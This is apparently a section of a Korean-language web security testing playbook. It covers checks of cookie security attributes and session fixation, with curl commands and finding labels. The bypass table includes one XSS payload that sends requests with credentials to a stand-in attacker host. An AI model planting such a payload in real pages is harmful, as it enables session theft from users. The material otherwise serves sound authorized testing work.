### Phase 2: 동적 테스트 (검증)

**정찰 페이로드:**

**Set-Cookie 발행 시점 수집:**
```bash
# 로그인 시점 쿠키 발행
curl -si -X POST "https://target/login" -d "username=U&password=P" | grep -i 'set-cookie'

# OAuth 콜백 후
curl -si "https://target/oauth/callback?code=X&state=Y" -b "pre_session" | grep -i 'set-cookie'

# 세션 갱신
curl -sI "https://target/" -H "Cookie: SESSION=X" | grep -i 'set-cookie'

# Remember-me / 로그인 유지
curl -si -X POST "https://target/login" -d "username=U&password=P&remember=1" | grep -i 'set-cookie'
```

**속성 파싱:**
```bash
# 각 Set-Cookie 헤더 파싱
curl -si "https://target/login" -d "username=U&password=P" 2>&1 | grep -i 'set-cookie:' | while read line; do
  echo "Cookie: $line"
  echo "  Secure:   $(echo "$line" | grep -ci 'secure')"
  echo "  HttpOnly: $(echo "$line" | grep -ci 'httponly')"
  echo "  SameSite: $(echo "$line" | grep -oiE 'samesite=[^;]*')"
  echo "  Max-Age:  $(echo "$line" | grep -oiE 'max-age=[^;]*')"
  echo "  Domain:   $(echo "$line" | grep -oiE 'domain=[^;]*')"
  echo "  Path:     $(echo "$line" | grep -oiE 'path=[^;]*')"
done
```

---

**기본 페이로드 (라벨별):**

**`COOKIE_NO_SECURE`:**
- 민감 쿠키에 `Secure` 미존재 → 확인됨
- HTTP 평문 환경에서 쿠키 노출 가능

**`COOKIE_NO_HTTPONLY`:**
- 세션 쿠키에 `HttpOnly` 미존재 → XSS 시 `document.cookie`로 탈취

**`COOKIE_SAMESITE_NONE`:**
- 명시 `SameSite=None` 발견 → cross-site 자동 전송 → CSRF 게이트 (csrf-scanner 결합)
- 미설정 (브라우저 기본 Lax)은 제외

**`COOKIE_PERSISTENT`:**
- 세션/인증 쿠키 `Max-Age > 7d` 또는 장기 `Expires`
- 공용 PC에서 브라우저 종료 후에도 세션 유지 → 탈취 영향도 격상

**`COOKIE_LOOSE_SCOPE`:**
- `Domain=.example.com` (상위 도메인) → 모든 서브도메인 공유
- subdomain takeover (subdomain-takeover-scanner 결합) 시 영향 확대

**`COOKIE_PREFIX_MISUSE`:**
- `__Host-` + `Domain` 조합 (브라우저 거부) → 의도 불일치
- `__Secure-` + `Secure` 미설정

**Session fixation 검증:**
```bash
# 로그인 전 쿠키
curl -si "https://target/" | grep -i 'set-cookie:' > /tmp/pre.txt

# 로그인
curl -si -X POST "https://target/login" -d "username=U&password=P" \
  -b "$(cat /tmp/pre.txt | grep -oP 'SESSION=[^;]+')" \
  | grep -i 'set-cookie:' > /tmp/post.txt

# 쿠키 값 동일 → session fixation
diff /tmp/pre.txt /tmp/post.txt
```

**Partitioned (CHIPS) 확인:**
```bash
curl -si "https://target/" | grep -i 'partitioned'
# Chrome 3rd-party cookie 차단 대응 — 적절히 적용되었는지 확인
```

---

**우회 페이로드:**

| 방어 | 우회 |
|---|---|
| 일부 쿠키만 Secure | 다수 Set-Cookie 중 민감 쿠키만 누락 가능 — 개별 점검 필수 |
| 환경 분기 (`if production`) | dev 분기 잔존 — 응답 헤더로만 확인 |
| 프록시 레벨 Secure | 프록시 우회 경로 (직접 backend 호출) — 가능하면 시도 |
| HttpOnly + JS API 의존 | XSS 결합 시 `<img src=x onerror="fetch('//attacker',{credentials:'include'})">` |

---

**참고사항:**

- Set-Cookie는 로그인/OAuth 콜백/remember-me 시점에 발행 — 이미 세션 있는 상태에서 일반 페이지는 없을 수 있음
- 민감 쿠키 판별: `JSESSIONID`, `connect.sid`, `sessionid`, `session`, `token`, `auth`, `jwt`, `remember`, `PHPSESSID`, `_session`, `csrf`, `xsrf`
- 다수 Set-Cookie는 각각 개별 판정 — 한 쿠키가 안전해도 다른 쿠키가 취약할 수 있음
- Spring Boot 2.x+, Django, Rails는 기본 `HttpOnly=true` — 프레임워크 확인
- Express `express-session` 기본 `cookie.secure: false` — 명시 설정 필수
- remember-me 토큰은 세션 ID보다 긴 TTL이 정상이지만 세션 ID 자체를 remember하면 `COOKIE_PERSISTENT`
- Partitioned (CHIPS)는 Chrome 3rd-party cookie 차단 대응 — 오용 시 세션 분리 실패
- Load balancer affinity cookie (`AWSALB`, nginx `sticky`)는 보안 속성 자동 미적용 — 별도 점검
- `Secure` 플래그는 HTTPS만 보내므로 HTTP 테스트 환경에선 안전 판정 보류
- `__Host-` prefix는 `Path=/` + `Secure` + `Domain` 미설정 모두 만족해야 — 브라우저가 강제
- `__Secure-` prefix는 `Secure` 필수 — 브라우저가 강제
- session fixation은 로그인 전 발급된 세션 ID가 로그인 후에도 유지될 때 — `regenerate` 호출 확인
- CSRF token용 HttpOnly 해제는 의도적 (Double Submit 패턴) — 세션 쿠키만 점검
- SameSite=Strict는 이메일 링크 first request에서 쿠키 미전송 — 사용성 trade-off (일부 기능 영향)
- 프레임워크 기본값 변경은 세션별로 영향 — Spring Boot 3.x는 2.x와 일부 다름
